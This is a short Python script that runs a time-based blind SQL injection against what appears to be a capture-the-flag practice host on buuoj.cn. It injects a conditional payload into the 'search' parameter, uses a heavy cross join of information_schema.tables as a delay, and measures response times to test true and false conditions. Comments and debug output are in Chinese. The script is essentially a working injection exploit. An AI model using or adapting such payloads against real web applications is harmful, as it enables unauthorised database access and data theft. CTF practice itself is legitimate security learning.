#!/usr/bin/env python3
import requests
import time

url = "http://b7a930e1-2905-4b23-a4e6-55294ddd82af.node5.buuoj.cn:81/index.php"

def check(condition):
    """时间盲注检测条件是否为真"""
    # 使用 heavy query 触发延迟
    heavy = "(select count(*) from information_schema.tables a,information_schema.tables b,information_schema.tables c)"
    payload = f"0 || if({condition},{heavy},0)"
    try:
        start = time.time()
        r = requests.get(url, params={"search": payload}, timeout=60)
        elapsed = time.time() - start
        print(f"    [DEBUG] condition={condition}, elapsed={elapsed:.3f}s")
        return elapsed > 0.2  # 降低阈值
    except Exception as e:
        print(f"    [ERROR] {e}")
        return False

# 测试
print("[*] Testing 1=1:")
result1 = check("1=1")
print(f"    Result: {result1}")
print("[*] Testing 1=2:")
result2 = check("1=2")
print(f"    Result: {result2}")
